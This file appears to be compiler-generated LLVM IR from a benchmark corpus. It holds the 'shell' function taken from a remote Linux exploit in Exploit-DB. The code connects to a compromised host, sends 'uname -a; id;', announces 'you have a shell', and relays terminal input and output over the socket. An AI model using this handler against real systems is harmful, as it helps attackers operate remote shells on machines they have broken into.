; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_1123.c_shell.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_1123.c_shell.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.hostent = type { i64 }
%struct.sockaddr_in = type { i32, %struct.in_addr, i32, i32 }
%struct.in_addr = type { i32 }
%struct.sockaddr = type { i32 }

@BUFFERSIZE = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [15 x i8] c"uname -a; id;\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@TIMEOUT = common dso_local global i32 0, align 4
@ERROR = common dso_local global i64 0, align 8
@.str.1 = private unnamed_addr constant [3 x i8] c"\0D\0D\00", align 1
@.str.2 = private unnamed_addr constant [29 x i8] c"\0A\0A [!] you have a shell :)\0A\0A\00", align 1
@stdout = common dso_local global i32 0, align 4

; Function Attrs: noinline nounwind optnone uwtable
define dso_local void @shell(i8* %0, i32 %1) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i64, align 8
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca %struct.hostent*, align 8
  %12 = alloca %struct.sockaddr_in, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  %13 = load i32, i32* @BUFFERSIZE, align 4
  %14 = zext i32 %13 to i64
  %15 = call i8* @llvm.stacksave()
  store i8* %15, i8** %7, align 8
  %16 = alloca i8, i64 %14, align 16
  store i64 %14, i64* %8, align 8
  store i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str, i64 0, i64 0), i8** %9, align 8
  %17 = load i8*, i8** %3, align 8
  %18 = call %struct.hostent* @gethostbyname(i8* %17)
  store %struct.hostent* %18, %struct.hostent** %11, align 8
  %19 = load i32, i32* @AF_INET, align 4
  %20 = load i32, i32* @SOCK_STREAM, align 4
  %21 = call i32 @socket(i32 %19, i32 %20, i32 0)
  store i32 %21, i32* %5, align 4
  %22 = load i32, i32* @AF_INET, align 4
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %12, i32 0, i32 3
  store i32 %22, i32* %23, align 4
  %24 = load i32, i32* %4, align 4
  %25 = call i32 @htons(i32 %24)
  %26 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %12, i32 0, i32 2
  store i32 %25, i32* %26, align 4
  %27 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %12, i32 0, i32 1
  %28 = load %struct.hostent*, %struct.hostent** %11, align 8
  %29 = getelementptr inbounds %struct.hostent, %struct.hostent* %28, i32 0, i32 0
  %30 = load i64, i64* %29, align 8
  %31 = inttoptr i64 %30 to %struct.in_addr*
  %32 = bitcast %struct.in_addr* %27 to i8*
  %33 = bitcast %struct.in_addr* %31 to i8*
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* align 4 %32, i8* align 4 %33, i64 4, i1 false)
  %34 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %12, i32 0, i32 0
  %35 = call i32 @bzero(i32* %34, i32 8)
  %36 = load i32, i32* %5, align 4
  %37 = bitcast %struct.sockaddr_in* %12 to %struct.sockaddr*
  %38 = load i32, i32* @TIMEOUT, align 4
  %39 = call i64 @connect_timeout(i32 %36, %struct.sockaddr* %37, i32 4, i32 %38)
  %40 = load i64, i64* @ERROR, align 8
  %41 = icmp eq i64 %39, %40
  br i1 %41, label %42, label %44

42:                                               ; preds = %2
  %43 = call i32 @printf(i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.1, i64 0, i64 0))
  br label %98

44:                                               ; preds = %2
  %45 = call i32 @printf(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.2, i64 0, i64 0))
  %46 = load i32, i32* @stdout, align 4
  %47 = call i32 @fflush(i32 %46)
  %48 = load i32, i32* %5, align 4
  %49 = load i8*, i8** %9, align 8
  %50 = load i8*, i8** %9, align 8
  %51 = call i32 @strlen(i8* %50)
  %52 = call i32 @send(i32 %48, i8* %49, i32 %51, i32 0)
  br label %53

53:                                               ; preds = %97, %44
  br label %54

54:                                               ; preds = %53
  %55 = call i32 @FD_ZERO(i32* %10)
  %56 = call i32 @FD_SET(i32 0, i32* %10)
  %57 = load i32, i32* %5, align 4
  %58 = call i32 @FD_SET(i32 %57, i32* %10)
  %59 = load i32, i32* %5, align 4
  %60 = add nsw i32 %59, 1
  %61 = call i32 @select(i32 %60, i32* %10, i32* null, i32* null, i32* null)
  %62 = icmp slt i32 %61, 1
  br i1 %62, label %63, label %65

63:                                               ; preds = %54
  %64 = call i32 @exit(i32 0) #5
  unreachable

65:                                               ; preds = %54
  %66 = call i64 @FD_ISSET(i32 0, i32* %10)
  %67 = icmp ne i64 %66, 0
  br i1 %67, label %68, label %83

68:                                               ; preds = %65
  %69 = trunc i64 %14 to i32
  %70 = call i32 @read(i32 0, i8* %16, i32 %69)
  store i32 %70, i32* %6, align 4
  %71 = icmp slt i32 %70, 1
  br i1 %71, label %72, label %74

72:                                               ; preds = %68
  %73 = call i32 @exit(i32 0) #5
  unreachable

74:                                               ; preds = %68
  %75 = load i32, i32* %5, align 4
  %76 = load i32, i32* %6, align 4
  %77 = call i32 @send(i32 %75, i8* %16, i32 %76, i32 0)
  %78 = load i32, i32* %6, align 4
  %79 = icmp ne i32 %77, %78
  br i1 %79, label %80, label %82

80:                                               ; preds = %74
  %81 = call i32 @exit(i32 0) #5
  unreachable

82:                                               ; preds = %74
  br label %83

83:                                               ; preds = %82, %65
  %84 = load i32, i32* %5, align 4
  %85 = call i64 @FD_ISSET(i32 %84, i32* %10)
  %86 = icmp ne i64 %85, 0
  br i1 %86, label %87, label %97

87:                                               ; preds = %83
  %88 = load i32, i32* %5, align 4
  %89 = trunc i64 %14 to i32
  %90 = call i32 @recv(i32 %88, i8* %16, i32 %89, i32 0)
  store i32 %90, i32* %6, align 4
  %91 = icmp slt i32 %90, 1
  br i1 %91, label %92, label %94

92:                                               ; preds = %87
  %93 = call i32 @exit(i32 0) #5
  unreachable

94:                                               ; preds = %87
  %95 = load i32, i32* %6, align 4
  %96 = call i32 @write(i32 1, i8* %16, i32 %95)
  br label %97

97:                                               ; preds = %94, %83
  br label %53

98:                                               ; preds = %42
  %99 = load i8*, i8** %7, align 8
  call void @llvm.stackrestore(i8* %99)
  ret void
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #1

declare dso_local %struct.hostent* @gethostbyname(i8*) #2

declare dso_local i32 @socket(i32, i32, i32) #2

declare dso_local i32 @htons(i32) #2

; Function Attrs: argmemonly nounwind willreturn
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* noalias nocapture writeonly, i8* noalias nocapture readonly, i64, i1 immarg) #3

declare dso_local i32 @bzero(i32*, i32) #2

declare dso_local i64 @connect_timeout(i32, %struct.sockaddr*, i32, i32) #2

declare dso_local i32 @printf(i8*) #2

declare dso_local i32 @fflush(i32) #2

declare dso_local i32 @send(i32, i8*, i32, i32) #2

declare dso_local i32 @strlen(i8*) #2

declare dso_local i32 @FD_ZERO(i32*) #2

declare dso_local i32 @FD_SET(i32, i32*) #2

declare dso_local i32 @select(i32, i32*, i32*, i32*, i32*) #2

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #4

declare dso_local i64 @FD_ISSET(i32, i32*) #2

declare dso_local i32 @read(i32, i8*, i32) #2

declare dso_local i32 @recv(i32, i8*, i32, i32) #2

declare dso_local i32 @write(i32, i8*, i32) #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind }
attributes #2 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { argmemonly nounwind willreturn }
attributes #4 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
